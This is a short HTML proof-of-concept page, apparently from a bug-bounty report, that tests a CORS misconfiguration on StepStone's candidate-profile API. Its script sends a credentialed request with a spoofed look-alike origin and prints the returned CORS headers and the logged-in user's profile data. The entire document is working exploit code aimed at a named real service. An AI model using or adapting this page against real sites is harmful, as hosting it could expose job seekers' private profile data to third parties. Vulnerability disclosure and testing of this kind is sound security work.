<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>StepStone CORS PoC</title>
</head>
<body>
<h1>StepStone CORS PoC</h1>
<button id="run">Run PoC</button>
<pre id="output"></pre>

<script>
document.getElementById("run").onclick = async () => {
    try {
        const response = await fetch('https://www.stepstone.de/candidate/profile/editor/api/v1/profile', {
            method: 'GET',
            credentials: 'include',
            headers: {
                'Origin': 'https://www.stepstone.de.i-am-hunter.xyz'
            }
        });
        const data = await response.json();
        document.getElementById("output").textContent =
            JSON.stringify({
                status: response.status,
                origin: response.headers.get('Access-Control-Allow-Origin'),
                credentials: response.headers.get('Access-Control-Allow-Credentials'),
                data: data
            }, null, 2);
    } catch (err) {
        document.getElementById("output").textContent = 'Error: ' + err;
    }
};
</script>
</body>
</html>
